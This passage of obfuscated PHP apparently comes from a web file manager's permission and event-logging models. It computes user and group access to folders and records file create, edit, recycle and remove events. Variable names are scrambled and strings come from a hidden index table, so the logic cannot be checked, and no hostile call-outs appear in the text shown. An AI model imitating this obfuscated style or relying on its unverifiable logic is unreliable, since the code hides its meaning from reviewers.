authDeepCheck($¤ˆ­†æû, $—éïĞÉ = false) { $×§šÒö =& $_SERVER[Ã¶¡¶„æ]; $—éïĞÉ = $—éïĞÉ ? $—éïĞÉ : USER_ID; $Ï–½˜ÅÏ = $this->makeAuthDeep($—éïĞÉ); if (!in_array($¤ˆ­†æû, $Ï–½˜ÅÏ[$×§šÒö[2053]])) { return !1; } $õ…ö†Ì = array(); foreach ($Ï–½˜ÅÏ[$×§šÒö[2054]] as $ıŞÏ†ñ => $”ú×²ùß) { if (!in_array($¤ˆ­†æû, $”ú×²ùß)) { continue; } $õ…ö†Ì[] = $ıŞÏ†ñ; } if (!$õ…ö†Ì) { return !1; } $úØò™Ğ¾ = $õ…ö†Ì ? $õ…ö†Ì[0] : $¤ˆ­†æû; return array($×§šÒö[414] => -1, $×§šÒö[467] => array($×§šÒö[419] => $×§šÒö[1203], $×§šÒö[1871] => $×§šÒö[197], $×§šÒö[420] => LNG($×§šÒö[2055]), $×§šÒö[1888] => $×§šÒö[2056]), $×§šÒö[2057] => LNG($×§šÒö[2058]), $×§šÒö[2059] => $this->sourceAuthInfo($úØò™Ğ¾)); } protected function makeAuthDeep($‰Ü‹ŸöĞ = false) { $ûÀ“×É =& $_SERVER[Ã¶¡¶„æ]; static $ï«·³îÍ = array(); $‰Ü‹ŸöĞ = $‰Ü‹ŸöĞ ? $‰Ü‹ŸöĞ : USER_ID; if (isset($ï«·³îÍ[$‰Ü‹ŸöĞ])) { return $ï«·³îÍ[$‰Ü‹ŸöĞ]; } $Ç»­¦â• = Model($ûÀ“×É[2060])->listData(); $ñáæéÔø = array(); foreach ($Ç»­¦â• as $ú”îöÚ) { if ($ú”îöÚ[$ûÀ“×É[413]] == 0 && $ú”îöÚ[$ûÀ“×É[1887]] == $ûÀ“×É[88]) { $ñáæéÔø[] = $ú”îöÚ[$ûÀ“×É[399]]; } } $•§‹Äãˆ = $this->userGroupParents($‰Ü‹ŸöĞ); $½šõªñº = array($ûÀ“×É[411] => SourceModel::TYPE_USER, $ûÀ“×É[505] => $‰Ü‹ŸöĞ); if ($•§‹Äãˆ) { $½šõªñº = array(array($ûÀ“×É[411] => SourceModel::TYPE_USER, $ûÀ“×É[505] => $‰Ü‹ŸöĞ), array($ûÀ“×É[411] => SourceModel::TYPE_GROUP, $ûÀ“×É[505] => array($ûÀ“×É[418], $•§‹Äãˆ)), $ûÀ“×É[1014] => $ûÀ“×É[1963]); } $£ã¢÷ĞÜ = $this->field($ûÀ“×É[2061])->where($½šõªñº)->select(); $ĞùšãòÂ = array(); $Ô¹‚ßÅå = array_to_keyvalue_group($£ã¢÷ĞÜ, $ûÀ“×É[402]); foreach ($Ô¹‚ßÅå as $¹ò©È‰µ => $áƒ‹¯œ÷) { $ İöËØ = $this->authArrayCheck($áƒ‹¯œ÷, $‰Ü‹ŸöĞ); if ($ İöËØ[$ûÀ“×É[414]] > 0) { $ĞùšãòÂ[] = $¹ò©È‰µ . $ûÀ“×É[12]; } } if ($•§‹Äãˆ) { $£æ‡÷íá = Model($ûÀ“×É[522]); foreach ($•§‹Äãˆ as $Œ×İîÀÍ) { $·¸¯Äö = $£æ‡÷íá->getInfo($Œ×İîÀÍ); if (!$·¸¯Äö || !is_array($·¸¯Äö[$ûÀ“×É[86]])) { continue; } $ĞùšãòÂ[] = $·¸¯Äö[$ûÀ“×É[86]][$ûÀ“×É[402]]; } } $›Æ›¶ûØ = array(); $àûïİ© = $•§‹Äãˆ; $ôÏˆ = Model($ûÀ“×É[1350]); $£æ‡÷íá = Model($ûÀ“×É[522]); $óòŞ‰šÑ = array(); $ìëÀô‚ã = array(); $ç„§åÂ = array(); $í«¡æş = array(); if ($ĞùšãòÂ) { $úÚîö† = $ôÏˆ->where(array($ûÀ“×É[402] => array($ûÀ“×É[418], $ĞùšãòÂ)))->select(); foreach ($úÚîö† as $¿™æº‚‚) { $°í±øéô = $ôÏˆ->parentLevelArray($¿™æº‚‚[$ûÀ“×É[521]]); $›Æ›¶ûØ = array_merge($›Æ›¶ûØ, $°í±øéô); $àûïİ©[] = $¿™æº‚‚[$ûÀ“×É[505]]; $óòŞ‰šÑ[$¿™æº‚‚[$ûÀ“×É[402]]] = $°í±øéô; $ìëÀô‚ã[$¿™æº‚‚[$ûÀ“×É[402]]] = $¿™æº‚‚[$ûÀ“×É[505]]; } } $àûïİ© = array_values(array_unique($àûïİ©)); $ÆÊ–ü‚é = $àûïİ©; foreach ($ÆÊ–ü‚é as $Œ×İîÀÍ) { $·¸¯Äö = $£æ‡÷íá->getInfo($Œ×İîÀÍ); $°í±øéô = $ôÏˆ->parentLevelArray($·¸¯Äö[$ûÀ“×É[521]]); $àûïİ© = array_merge($àûïİ©, $°í±øéô); } $àûïİ© = array_values(array_unique($àûïİ©)); foreach ($àûïİ© as $Œ×İîÀÍ) { $·¸¯Äö = $£æ‡÷íá->getInfo($Œ×İîÀÍ); $›Æ›¶ûØ[] = $·¸¯Äö[$ûÀ“×É[86]][$ûÀ“×É[402]]; $ç„§åÂ[$Œ×İîÀÍ] = $·¸¯Äö[$ûÀ“×É[86]][$ûÀ“×É[402]]; $í«¡æş[$Œ×İîÀÍ] = $ôÏˆ->parentLevelArray($·¸¯Äö[$ûÀ“×É[521]]); } foreach ($óòŞ‰šÑ as $‚€¬şÕ’ => $‚êì—¯) { $î¶ØÜÌ = $ìëÀô‚ã[$‚€¬şÕ’]; if (!$î¶ØÜÌ || !$ç„§åÂ[$î¶ØÜÌ]) { continue; } $ ·¡– = array(); foreach ($í«¡æş[$î¶ØÜÌ] as $Œ×İîÀÍ) { $ ·¡–[] = $ç„§åÂ[$Œ×İîÀÍ]; } $óòŞ‰šÑ[$‚€¬şÕ’] = array_merge($ ·¡–, $‚êì—¯); } $›Æ›¶ûØ = array_values(array_unique($›Æ›¶ûØ)); $·æ¿ä‚Ÿ = array($ûÀ“×É[2053] => $›Æ›¶ûØ, $ûÀ“×É[2054] => $óòŞ‰šÑ); $ï«·³îÍ[$‰Ü‹ŸöĞ] = $·æ¿ä‚Ÿ; return $·æ¿ä‚Ÿ; } private function makeSourceAuth($¸ÇÏü¬ö, $£üÙ¿, $ÖŠ‡š×‘ = false) { $ÁîÌş†º =& $_SERVER[Ã¶¡¶„æ]; $¼´†åš = $ÁîÌş†º[88]; $ñ™Ûü¸Ç = $¸ÇÏü¬ö[$ÁîÌş†º[505]]; $’·ÍÛÇÍ = $¸ÇÏü¬ö[$ÁîÌş†º[411]] == SourceModel::TYPE_GROUP; $Ä¬ÕòÏ± = $’·ÍÛÇÍ ? $this->groupRootAuth($ñ™Ûü¸Ç, $ÖŠ‡š×‘) : !1; if ($Ä¬ÕòÏ± && Model($ÁîÌş†º[507])->authCheckAction($Ä¬ÕòÏ±[$ÁîÌş†º[413]], $ÁîÌş†º[1886])) { return $this->groupAuthInfo($Ä¬ÕòÏ±, $ñ™Ûü¸Ç); } $’˜¶–„ = Model($ÁîÌş†º[1350])->parentLevelArray($¸ÇÏü¬ö[$ÁîÌş†º[521]]); $’˜¶–„ = array_merge(array($¸ÇÏü¬ö[$ÁîÌş†º[402]]), array_reverse($’˜¶–„)); $†šóğ“© = !1; foreach ($’˜¶–„ as $Å·Ûü±’) { if (!isset($£üÙ¿[$Å·Ûü±’])) { continue; } $¹ñÀŸ¥ = $this->authMake($£üÙ¿[$Å·Ûü±’], $ÖŠ‡š×‘); if ($¹ñÀŸ¥[$ÁîÌş†º[467]]) { $†šóğ“© = $¹ñÀŸ¥; break; } } if (!$’·ÍÛÇÍ) { return $†šóğ“©; } if (!$†šóğ“© && $Ä¬ÕòÏ±) { $†šóğ“© = $this->groupAuthInfo($Ä¬ÕòÏ±, $ñ™Ûü¸Ç); } if (!$†šóğ“©) { $äı›¤§Ã = Model($ÁîÌş†º[522])->getInfo($ñ™Ûü¸Ç); $¹‚Ïù—” = explode($ÁîÌş†º[50], trim($äı›¤§Ã[$ÁîÌş†º[521]], $ÁîÌş†º[50])); $¹‚Ïù—” = array_reverse($¹‚Ïù—”); foreach ($¹‚Ïù—” as $å‡Ò€÷ä) { if ($å‡Ò€÷ä == $ÁîÌş†º[197] || $å‡Ò€÷ä == $¼´†åš) { continue; } $™Ø±øğÚ = $this->groupRootAuth($å‡Ò€÷ä, $ÖŠ‡š×‘); if (!$™Ø±øğÚ) { continue; } $†šóğ“© = $this->groupAuthInfo($™Ø±øğÚ, $å‡Ò€÷ä); break; } } if (!$†šóğ“© || $†šóğ“©[$ÁîÌş†º[414]] <= 0) { $—ì©§¬¿ = $this->authDeepCheck($¸ÇÏü¬ö[$ÁîÌş†º[402]], $ÖŠ‡š×‘); if ($—ì©§¬¿) { $†šóğ“© = $—ì©§¬¿; } } return $†šóğ“©; } private function userIsRoot($÷ß‘æô¼ = false) { $´Æ§Û€š =& $_SERVER[Ã¶¡¶„æ]; if (!$÷ß‘æô¼ && _get($GLOBALS, $´Æ§Û€š[503])) { return !0; } $ÔÓÕš = Model($´Æ§Û€š[535])->getInfo($÷ß‘æô¼); $Ì«­Ú“î = Model($´Æ§Û€š[2062])->listData($ÔÓÕš[$´Æ§Û€š[1557]]); if ($Ì«­Ú“î && $Ì«­Ú“î[$´Æ§Û€š[511]][$´Æ§Û€š[2063]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ˆáŒÈ×†) { $úèÊÜî =& $_SERVER[Ã¶¡¶„æ]; $ë¯³‡ÌÀ = Model($úèÊÜî[1350]); $È“¬‡Ñ… = $ë¯³‡ÌÀ->sourceInfo($ˆáŒÈ×†); if (!$È“¬‡Ñ…) { return !1; } $ë¯³‡ÌÀ->groupPathDisplay($È“¬‡Ñ…); $îšˆ £» = array($È“¬‡Ñ…); $îšˆ £» = $ë¯³‡ÌÀ->_listAppendPath($îšˆ £»); $È“¬‡Ñ… = $îšˆ £»[0]; $ÏÛ¶ÜŸÏ = $È“¬‡Ñ…[$úèÊÜî[519]]; if (isset($È“¬‡Ñ…[$úèÊÜî[527]])) { $œ©àñŸã = explode($úèÊÜî[8], trim($È“¬‡Ñ…[$úèÊÜî[519]], $úèÊÜî[8])); array_shift($œ©àñŸã); $ÏÛ¶ÜŸÏ = $È“¬‡Ñ…[$úèÊÜî[525]] . $úèÊÜî[2064] . implode($úèÊÜî[8], $œ©àñŸã); } return array($úèÊÜî[420] => $È“¬‡Ñ…[$úèÊÜî[32]], $úèÊÜî[84] => KodIO::make($È“¬‡Ñ…[$úèÊÜî[402]]), $úèÊÜî[2065] => $ÏÛ¶ÜŸÏ); } private function groupAuthInfo($ßœ¨ºµœ, $±ı¡Şï¶) { $çÒ²®› =& $_SERVER[Ã¶¡¶„æ]; $•›Ğê±° = Model($çÒ²®›[522])->getInfo($±ı¡Şï¶); return array($çÒ²®›[2066] => intval($ßœ¨ºµœ[$çÒ²®›[413]]), $çÒ²®›[2050] => $ßœ¨ºµœ, $çÒ²®›[2067] => LNG($çÒ²®›[2068]), $çÒ²®›[2059] => array($çÒ²®›[420] => $•›Ğê±°[$çÒ²®›[32]], $çÒ²®›[84] => KodIO::make($•›Ğê±°[$çÒ²®›[86]][$çÒ²®›[402]]), $çÒ²®›[2065] => $•›Ğê±°[$çÒ²®›[526]])); } protected function groupRootAuth($äÁÏğìÁ, $Ø©ú¼¶¨ = false) { $£ªşôË =& $_SERVER[Ã¶¡¶„æ]; $Ø©ú¼¶¨ = $Ø©ú¼¶¨ ? $Ø©ú¼¶¨ : USER_ID; $ûé¹Ÿ‚ü = $Ø©ú¼¶¨ . $£ªşôË[2069] . $äÁÏğìÁ; static $¶˜İÔàˆ = array(); if (isset($¶˜İÔàˆ[$ûé¹Ÿ‚ü])) { return $¶˜İÔàˆ[$ûé¹Ÿ‚ü]; } $¯ı€·è = Model($£ªşôË[522])->getInfo($äÁÏğìÁ); $•ûú‡¸ = $this->userGroupList($Ø©ú¼¶¨); $Ä·ÉÏ¸ = isset($•ûú‡¸[$äÁÏğìÁ]) ? $•ûú‡¸[$äÁÏğìÁ][$£ªşôË[413]] : !1; if ($Ä·ÉÏ¸ && Model($£ªşôË[507])->authCheckAction($Ä·ÉÏ¸[$£ªşôË[413]], $£ªşôË[1886])) { $¶˜İÔàˆ[$ûé¹Ÿ‚ü] = $Ä·ÉÏ¸; return $Ä·ÉÏ¸; } $êº¹€÷ù = $this->sourceAuthSelect($¯ı€·è[$£ªşôË[86]][$£ªşôË[402]]); $ÑÅáüÅ· = $êº¹€÷ù ? $this->authMake($êº¹€÷ù, $Ø©ú¼¶¨) : !1; $Ì˜¢”« = $ÑÅáüÅ· ? $ÑÅáüÅ·[$£ªşôË[467]] : !1; $¶˜İÔàˆ[$ûé¹Ÿ‚ü] = $Ì˜¢”« ? $Ì˜¢”« : $Ä·ÉÏ¸; return $¶˜İÔàˆ[$ûé¹Ÿ‚ü]; } public function authOwnerApply($Ûì •¢‡) { $ô®ı‡— =& $_SERVER[Ã¶¡¶„æ]; if (empty($Ûì •¢‡[$ô®ı‡—[413]]) || isset($Ûì •¢‡[$ô®ı‡—[2070]]) && $Ûì •¢‡[$ô®ı‡—[2070]]) { return $Ûì •¢‡; } if (AuthModel::authCheckRoot($Ûì •¢‡[$ô®ı‡—[413]][$ô®ı‡—[414]])) { return $Ûì •¢‡; } $„ê«Şª– = Model($ô®ı‡—[1350])->parentLevelArray($Ûì •¢‡[$ô®ı‡—[521]]); $„ê«Şª– = array_merge(array($Ûì •¢‡[$ô®ı‡—[402]]), array_reverse($„ê«Şª–)); $ş“¯ŸŠË = $this->sourceAuthSelect($„ê«Şª–); $ˆ”„ÓÅ½ = array(); $¾É‘­‘É = array(); foreach ($ş“¯ŸŠË as $‡©©¥µ => $ áéòå) { $ı«àÛââ = $this->authFolderOwnerUser($ áéòå); $ˆ”„ÓÅ½[$‡©©¥µ] = $ı«àÛââ; $¾É‘­‘É = array_merge($¾É‘­‘É, $ı«àÛââ[$ô®ı‡—[600]]); if ($ı«àÛââ[$ô®ı‡—[2071]]) { break; } } if (count($¾É‘­‘É) == 0) { $¾É‘­‘É = $this->authFolderOwnerGroup($Ûì •¢‡[$ô®ı‡—[505]]); } $¾É‘­‘É = array_unique($¾É‘­‘É); if (AuthModel::authCheckRoot($Ûì •¢‡[$ô®ı‡—[413]][$ô®ı‡—[414]])) { $¾É‘­‘É[] = USER_ID; } $Ûì •¢‡[$ô®ı‡—[413]][$ô®ı‡—[2072]] = Model($ô®ı‡—[513])->userListInfo($¾É‘­‘É); return $Ûì •¢‡; } private function authFolderOwnerGroup($Õşš›¢‡) { $ˆ®­äŞ =& $_SERVER[Ã¶¡¶„æ]; $³ÈÅÓşÄ = Model($ˆ®­äŞ[1955])->where(array($ˆ®­äŞ[1865] => $Õşš›¢‡))->select(); $ö¯ÉìÒ‚ = array(); if (!$³ÈÅÓşÄ) { return $ö¯ÉìÒ‚; } foreach ($³ÈÅÓşÄ as $±‰›öÚ¶) { $ª¥£èÄÔ = $this->authInfo($±‰›öÚ¶); if (AuthModel::authCheckRoot($ª¥£èÄÔ[$ˆ®­äŞ[413]])) { $ö¯ÉìÒ‚[] = $±‰›öÚ¶[$ˆ®­äŞ[1676]]; } } return $ö¯ÉìÒ‚; } private function authFolderOwnerUser($š¬ò±•») { $µşè¼Õœ =& $_SERVER[Ã¶¡¶„æ]; $š§Öì’µ = array(); $ö¥„­ğ = !1; foreach ($š¬ò±•» as $©«×µÚ) { $¥“ßÖÌ€ = $this->authInfo($©«×µÚ); if ($©«×µÚ[$µşè¼Õœ[505]] == $µşè¼Õœ[197]) { $ö¥„­ğ = !0; } if ($©«×µÚ[$µşè¼Õœ[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¥“ßÖÌ€[$µşè¼Õœ[413]])) { $š§Öì’µ[] = $©«×µÚ[$µşè¼Õœ[505]]; } } } return array($µşè¼Õœ[600] => $š§Öì’µ, $µşè¼Õœ[2071] => $ö¥„­ğ); } public function authMake($¿çÛ£é¸, $‹û‚ı±ç = false) { $î¡æòŸÄ =& $_SERVER[Ã¶¡¶„æ]; $çÒ‹¡˜£ = $this->authArrayCheck($¿çÛ£é¸, $‹û‚ı±ç); if ($çÒ‹¡˜£[$î¡æòŸÄ[2073]]) { $çÒ‹¡˜£[$î¡æòŸÄ[2073]] = $this->sourceAuthInfo($çÒ‹¡˜£[$î¡æòŸÄ[2073]]); } return $çÒ‹¡˜£; } public function authArrayCheck($ÕÖ†¡œ§, $‚×ÚòØ = false) { $¥×ÏÊì— =& $_SERVER[Ã¶¡¶„æ]; if (!$ÕÖ†¡œ§) { return array($¥×ÏÊì—[414] => 0, $¥×ÏÊì—[467] => !1); } $‚×ÚòØ = $‚×ÚòØ ? $‚×ÚòØ : USER_ID; $£±”‡¸ = 0; $”Ô¶Œ´Â = 0; $£Íü…¬ = 0; $êòÑ‘úÆ = 0; $ÄÚØÑ™ƒ = 0; $Íéš€Ü® = 0; $ŠºÖ†úé = 1000; $Ì³‘å¼ = 0; $¢±·£àµ = 0; $·Â™ùó° = 0; $Ì¸ºœ× = 0; $¬ä…ØÆ¿ = array($¥×ÏÊì—[402] => 0); foreach ($ÕÖ†¡œ§ as $¬ä…ØÆ¿) { $ÅëÄğƒÊ = $this->authInfo($¬ä…ØÆ¿); if (!$ÅëÄğƒÊ) { continue; } $ò°Â‡¸¶ = $¬ä…ØÆ¿[$¥×ÏÊì—[505]]; $ÙÇ¢äù— = intval($ÅëÄğƒÊ[$¥×ÏÊì—[413]]); if ($¬ä…ØÆ¿[$¥×ÏÊì—[411]] == SourceModel::TYPE_USER && $ò°Â‡¸¶ == $‚×ÚòØ) { $£±”‡¸ = !0; $£Íü…¬ = $ÅëÄğƒÊ; $”Ô¶Œ´Â = $ÙÇ¢äù—; } else { if ($¬ä…ØÆ¿[$¥×ÏÊì—[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ò°Â‡¸¶, $‚×ÚòØ)) { $êòÑ‘úÆ = !0; $í§óü·Ï = $this->groupStepToUserGroup($ò°Â‡¸¶, $‚×ÚòØ); if ($í§óü·Ï < $ŠºÖ†úé) { $ŠºÖ†úé = $í§óü·Ï; $ÄÚØÑ™ƒ = $ÙÇ¢äù—; $Íéš€Ü® = $ÅëÄğƒÊ; $Ì³‘å¼ = $ò°Â‡¸¶; } if ($í§óü·Ï == $ŠºÖ†úé && $ÙÇ¢äù— >= $ÄÚØÑ™ƒ) { $ÄÚØÑ™ƒ = $ÙÇ¢äù—; $Íéš€Ü® = $ÅëÄğƒÊ; $Ì³‘å¼ = $ò°Â‡¸¶; } } else { if ($ò°Â‡¸¶ == $¥×ÏÊì—[197]) { $¢±·£àµ = !0; $Ì¸ºœ× = $ÅëÄğƒÊ; $·Â™ùó° = $ÙÇ¢äù—; } } } } if ($£±”‡¸) { $Õ²¬õ” = $”Ô¶Œ´Â; $ÅëÄğƒÊ = $£Íü…¬; $±™ùÁ£ = LNG($¥×ÏÊì—[2074]); } else { if ($êòÑ‘úÆ) { $Õ²¬õ” = $ÄÚØÑ™ƒ; $ÅëÄğƒÊ = $Íéš€Ü®; $šÍî­¬¢ = Model($¥×ÏÊì—[522])->getInfo($Ì³‘å¼); $±™ùÁ£ = $¥×ÏÊì—[162] . $šÍî­¬¢[$¥×ÏÊì—[526]] . $¥×ÏÊì—[2075] . LNG($¥×ÏÊì—[2076]); } else { if ($¢±·£àµ) { $Õ²¬õ” = $·Â™ùó°; $ÅëÄğƒÊ = $Ì¸ºœ×; $±™ùÁ£ = LNG($¥×ÏÊì—[2047]); } else { $Õ²¬õ” = 0; $ÅëÄğƒÊ = !1; $±™ùÁ£ = $¥×ÏÊì—[12]; } } } $é´×âÈ = array($¥×ÏÊì—[2066] => intval($Õ²¬õ”), $¥×ÏÊì—[2050] => $ÅëÄğƒÊ, $¥×ÏÊì—[2067] => $±™ùÁ£, $¥×ÏÊì—[2059] => $¬ä…ØÆ¿[$¥×ÏÊì—[402]]); return $é´×âÈ; } private function groupContainUser($Ïßèğëª, $Ùš¸‡¶ã = false) { return in_array($Ïßèğëª, $this->userGroupParents($Ùš¸‡¶ã)); } private function groupStepToUserGroup($ÇÌÒ·, $Â×¤ú±Ò = false) { $¦×§ø’ª =& $_SERVER[Ã¶¡¶„æ]; $´ÂøÒõÑ = $this->userGroupList($Â×¤ú±Ò); $µªËëÅó = 1000; $¼¢˜Èªë = $GLOBALS[$¦×§ø’ª[6]][$¦×§ø’ª[89]][$¦×§ø’ª[1968]] == 1; $Åş¬¡„Ÿ = $¼¢˜Èªë ? 3 : 2; foreach ($´ÂøÒõÑ as $üÆã…) { if ($üÆã…[$¦×§ø’ª[1865]] == $ÇÌÒ·) { return 0; } $Ôí¶£ıê = explode($¦×§ø’ª[50], trim($üÆã…[$¦×§ø’ª[521]], $¦×§ø’ª[50])); if ($Ôí¶£ıê[0] == $¦×§ø’ª[197] && count($Ôí¶£ıê) > $Åş¬¡„Ÿ) { $¦¶¨ìŠÚ = array_reverse(array_slice($Ôí¶£ıê, $Åş¬¡„Ÿ)); $½¸Õ—ÀÑ = array_search($ÇÌÒ·, $¦¶¨ìŠÚ); if ($½¸Õ—ÀÑ !== !1 && $½¸Õ—ÀÑ + 1 <= $µªËëÅó) { $µªËëÅó = $½¸Õ—ÀÑ + 1; } } } return $µªËëÅó; } private function userGroupList($×í¥¸è„ = false) { $ïı±áÅü =& $_SERVER[Ã¶¡¶„æ]; static $Ë® µÇö = array(); if (isset($Ë® µÇö[$×í¥¸è„])) { return $Ë® µÇö[$×í¥¸è„]; } $„è‰Ø¸ì = Model($ïı±áÅü[535])->getInfo($×í¥¸è„); $Ë® µÇö[$×í¥¸è„] = array_to_keyvalue($„è‰Ø¸ì[$ïı±áÅü[2048]], $ïı±áÅü[1865]); return $Ë® µÇö[$×í¥¸è„]; } public function userGroupParents($Óê÷æï) { $¥Õûå¶À =& $_SERVER[Ã¶¡¶„æ]; static $«å’—Ü = array(); $Óê÷æï = $Óê÷æï ? $Óê÷æï : USER_ID; if (isset($«å’—Ü[$Óê÷æï])) { return $«å’—Ü[$Óê÷æï]; } $Ğçäü = $this->userGroupList($Óê÷æï); $Ü„×Ïµ’ = array(); $Èˆ®¬ = $GLOBALS[$¥Õûå¶À[6]][$¥Õûå¶À[89]][$¥Õûå¶À[1968]] == 1; $Ò¤»òçå = $Èˆ®¬ ? 3 : 2; foreach ($Ğçäü as $êıĞı¾¦) { $şîèÕœú = array($êıĞı¾¦[$¥Õûå¶À[1865]]); $¦ÃŸ§† = explode($¥Õûå¶À[50], trim($êıĞı¾¦[$¥Õûå¶À[521]], $¥Õûå¶À[50])); if ($¦ÃŸ§†[0] == $¥Õûå¶À[197] && count($¦ÃŸ§†) > $Ò¤»òçå) { $õİƒ‡âû = array_slice($¦ÃŸ§†, $Ò¤»òçå); $şîèÕœú = array_merge($şîèÕœú, array_reverse($õİƒ‡âû)); } $Ü„×Ïµ’ = array_merge($Ü„×Ïµ’, $şîèÕœú); } $«å’—Ü[$Óê÷æï] = array_unique($Ü„×Ïµ’); return $«å’—Ü[$Óê÷æï]; } public function authTargetInfoMake($ õ­ƒáƒ) { $Ù×„ÀÓú =& $_SERVER[Ã¶¡¶„æ]; $úÈ‡½Óæ = array(); $¯ş‹¤¿ = array(); foreach ($ õ­ƒáƒ as $ı”ğÒµ½) { if ($ı”ğÒµ½[$Ù×„ÀÓú[411]] == SourceModel::TYPE_USER) { $úÈ‡½Óæ[] = intval($ı”ğÒµ½[$Ù×„ÀÓú[505]]); } else { if ($ı”ğÒµ½[$Ù×„ÀÓú[411]] == SourceModel::TYPE_GROUP) { $¯ş‹¤¿[] = intval($ı”ğÒµ½[$Ù×„ÀÓú[505]]); } } } if ($úÈ‡½Óæ) { $úÈ‡½Óæ = Model($Ù×„ÀÓú[513])->userListInfo($úÈ‡½Óæ); } if ($¯ş‹¤¿) { $é¤­ø·Ã = array($Ù×„ÀÓú[1953] => array($Ù×„ÀÓú[418], $¯ş‹¤¿)); $¯ş‹¤¿ = Model($Ù×„ÀÓú[522])->field($Ù×„ÀÓú[2077])->where($é¤­ø·Ã)->select(); $¯ş‹¤¿ = array_to_keyvalue($¯ş‹¤¿, $Ù×„ÀÓú[1865]); } return array($Ù×„ÀÓú[2078] => $úÈ‡½Óæ, $Ù×„ÀÓú[2079] => $¯ş‹¤¿); } public function authInfo($™—¹Ê) { $¦õÂç“ =& $_SERVER[Ã¶¡¶„æ]; if ($™—¹Ê[$¦õÂç“[1969]]) { $ïŠ­ÈÄÔ = Model($¦õÂç“[507])->listData($™—¹Ê[$¦õÂç“[1969]]); if (!$ïŠ­ÈÄÔ) { return !1; $Å¬äˆ÷¼ = Model($¦õÂç“[507])->listData(); $¡êÁÃÅ¸ = array_filter_by_field($Å¬äˆ÷¼, $¦õÂç“[413], $¦õÂç“[197]); return $¡êÁÃÅ¸; } $³À–¨´Ù = array_field_key($ïŠ­ÈÄÔ, array($¦õÂç“[399], $¦õÂç“[32], $¦õÂç“[413], $¦õÂç“[1888], $¦õÂç“[1889])); $³À–¨´Ù[$¦õÂç“[2080]] = $™—¹Ê; return $³À–¨´Ù; } else { return array($¦õÂç“[419] => 0, $¦õÂç“[1871] => $™—¹Ê[$¦õÂç“[2025]], $¦õÂç“[420] => $¦õÂç“[12], $¦õÂç“[1888] => $¦õÂç“[2081]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\x72\x63\145\137\145\x76\x65\x6e\164"; protected $dataAuto = array(array("\143\162\x65\x61\164\x65\x54\x69\x6d\x65", "\x74\x69\155\145", "\x69\156\163\x65\x72\164", "\x66\165\x6e\x63\x74\151\x6f\156"), array("\x64\145\x73\143", '', "\x69\156\x73\x65\x72\164\x2c\165\x70\x64\141\x74\x65\54\x73\145\x6c\x65\143\164", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($£‚ø÷•è, $¿ÎÆŠÃ, $Œéáå = '') { $óàÂêî =& $_SERVER[Ã¶¡¶„æ]; if (!$this->eventSave) { return; } $¯¬¯’ê = Model($óàÂêî[1350])->sourceInfo($£‚ø÷•è); if (!$¯¬¯’ê) { return !1; } if ($this->isCacheEvent($¯¬¯’ê, $¿ÎÆŠÃ)) { return; } if ($Œéáå && is_string($Œéáå)) { $Œéáå = array($óàÂêî[1904] => $Œéáå); } $„¨æÄ§‰ = array($óàÂêî[417] => $£‚ø÷•è, $óàÂêî[2082] => $¯¬¯’ê[$óàÂêî[432]], $óàÂêî[2083] => $¯¬¯’ê[$óàÂêî[32]], $óàÂêî[519] => !empty($¯¬¯’ê[$óàÂêî[519]]) ? $¯¬¯’ê[$óàÂêî[519]] : $óàÂêî[12], $óàÂêî[1667] => USER_ID, $óàÂêî[422] => $¿ÎÆŠÃ, $óàÂêî[1669] => $Œéáå); $this->addSystemLog($¿ÎÆŠÃ, $„¨æÄ§‰); unset($„¨æÄ§‰[$óàÂêî[2083]], $„¨æÄ§‰[$óàÂêî[519]]); return $this->add($„¨æÄ§‰); } private function addSystemLog($•Á–åË’, $â¤•²) { $ƒç’¯Ô® =& $_SERVER[Ã¶¡¶„æ]; if ($•Á–åË’ == $ƒç’¯Ô®[2084]) { $•Á–åË’ = $â¤•²[$ƒç’¯Ô®[453]][$ƒç’¯Ô®[2085]]; } else { if (in_array($•Á–åË’, array($ƒç’¯Ô®[1845], $ƒç’¯Ô®[2086]))) { $•Á–åË’ = $â¤•²[$ƒç’¯Ô®[453]][$ƒç’¯Ô®[761]]; } } $æó«œ“ = array_merge($â¤•², array($ƒç’¯Ô®[2087] => $â¤•²[$ƒç’¯Ô®[402]], $ƒç’¯Ô®[2088] => $â¤•²[$ƒç’¯Ô®[2088]])); Hook::trigger($ƒç’¯Ô®[2089], $ƒç’¯Ô®[2090] . $•Á–åË’, $â¤•²); Model($ƒç’¯Ô®[1809])->addLog($ƒç’¯Ô®[2090] . $•Á–åË’, $æó«œ“); } private function isCacheEvent($ş„¶ÀÔ, $Ù¡¨î¶ï) { if ($ş„¶ÀÔ[$_SERVER[Ã¶¡¶„æ][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ï¦Ø¸àË, $Ù¬îä»ş) { $ˆË™îú± =& $_SERVER[Ã¶¡¶„æ]; $ôšÆØ¤Ğ = Model($ˆË™îú±[1350])->sourceInfo($ï¦Ø¸àË); $´‡Ü¹¢ = array($ˆË™îú±[2085] => $Ù¬îä»ş, $ˆË™îú±[32] => $ôšÆØ¤Ğ[$ˆË™îú±[32]]); return $this->addEvent($ï¦Ø¸àË, $ˆË™îú±[2084], $´‡Ü¹¢); } public function eventFileEdit($º€ıÈÂõ) { $®Ãßø =& $_SERVER[Ã¶¡¶„æ]; $ÊµøàŠÃ = array($®Ãßø[2091] => $_SERVER[$®Ãßø[2092]], $®Ãßø[2093] => strtolower(ACTION)); if (isset($GLOBALS[$®Ãßø[7]][$®Ãßø[2094]])) { $ÊµøàŠÃ[$®Ãßø[2094]] = $®Ãßø[88]; } return $this->addEvent($º€ıÈÂõ, $®Ãßø[1835], $ÊµøàŠÃ); } public function eventRecycle($Â©ÂÁ¤µ, $öÔÜ£­Õ) { return $this->addEvent($Â©ÂÁ¤µ, $_SERVER[Ã¶¡¶„æ][2086], $öÔÜ£­Õ); } public function eventRemove($€¿ÀÃİ) { $Üå™ÙÏ´ =& $_SERVER[Ã¶¡¶„æ]; $­”ªÕö = Model($Üå™ÙÏ´[1350])->sourceInfo($€¿ÀÃİ); $‚§ë‰À´ = $­”ªÕö[$Üå™ÙÏ´[32]]; return $this->addEvent($­”ªÕö[$Üå™ÙÏ´[432]], $Üå™ÙÏ´[1834], $‚§ë‰À´); } public function eventShare($œŞ…¦†, 